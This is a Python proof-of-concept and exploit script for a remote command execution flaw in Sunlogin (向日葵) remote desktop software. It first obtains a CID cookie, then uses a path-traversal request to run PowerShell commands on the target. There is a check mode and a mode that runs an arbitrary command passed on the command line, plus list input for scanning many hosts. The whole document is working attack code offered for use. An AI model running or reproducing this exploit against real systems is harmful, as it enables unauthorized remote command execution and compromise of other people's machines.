import requests
import json
import argparse
import socket

def get_cid(url, port):
    vul_url = url + ':' + port + '/cgi-bin/rpc?action=verify-haras'
    r = requests.get(url=vul_url)
    if r.status_code == 200 and "verify_string" in r.text:
        cid = json.loads(r.text).get('verify_string')
        return cid

def poc(url, port):
    cid = get_cid(url, port)
    headers = {
        'Cookie': "{}".format("CID=" + cid)
    }
    vul_url = url + ':' + port + '/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+sxq111'
    r = requests.get(url=vul_url, headers=headers)
    if 'sxq111' in r.text:
        print('{}'.format("[!]"+url+':'+port+"存在向日葵rce漏洞\n"))
        return True
    else:
        print('{}'.format("[-]"+url+':'+port+"不存在向日葵rce漏洞\n"))
        return False

def rce(url, port, cmd):
    if poc(url, port):
        cid = get_cid(url, port)
        headers = {
            'Cookie': "{}".format("CID=" + cid)
        }
        vul_url = url + ':' + port + '/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+' + cmd
        r = requests.get(url=vul_url, headers=headers)
        print(r.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', type=str)
    parser.add_argument('-p', type=str)
    parser.add_argument('-c', type=str)
    parser.add_argument('-l', type=argparse.FileType('r'))
    args = parser.parse_args()
    if args.u is not None and args.p is not None and args.c is None:
        poc(args.u, args.p)
    elif args.u is not None and args.p is not None and args.c is not None:
        rce(args.u, args.p, args.c)
    elif args.l is not None:
        with args.l as file:
            target = file.readline()
            url = target.split(':')[0]
            port = target.split(':')[1]
            poc(url, port)

